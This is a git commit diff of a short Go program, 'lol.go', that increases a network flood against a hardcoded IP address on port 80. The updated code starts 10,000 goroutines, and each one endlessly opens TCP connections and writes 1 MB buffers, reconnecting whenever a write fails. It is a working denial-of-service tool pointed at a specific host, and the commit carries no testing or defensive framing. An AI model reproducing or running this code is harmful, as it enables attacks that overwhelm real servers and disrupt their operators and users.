4c3e9d08d38fd4a0f38ea396b19fea9ab035da3e
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-19 00:04:07 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -7,15 +7,23 @@ import (
 
 func main() {
 	var wg sync.WaitGroup
+	data := make([]byte, 1024*1024) // 1 MB of data
 
-	for i := 0; i < 100; i++ {
+	for i := 0; i < 10000; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for {
-				conn, _ := net.Dial("tcp", "193.228.196.49:80")
-				if conn != nil {
-					conn.Close()
+				conn, err := net.Dial("tcp", "193.228.196.49:80")
+				if err != nil {
+					continue // if connection fails, retry
+				}
+				for {
+					_, err := conn.Write(data) // Send 1 MB of data
+					if err != nil {
+						conn.Close()
+						break // if write fails, close and open a new connection
+					}
 				}
 			}
 		}()
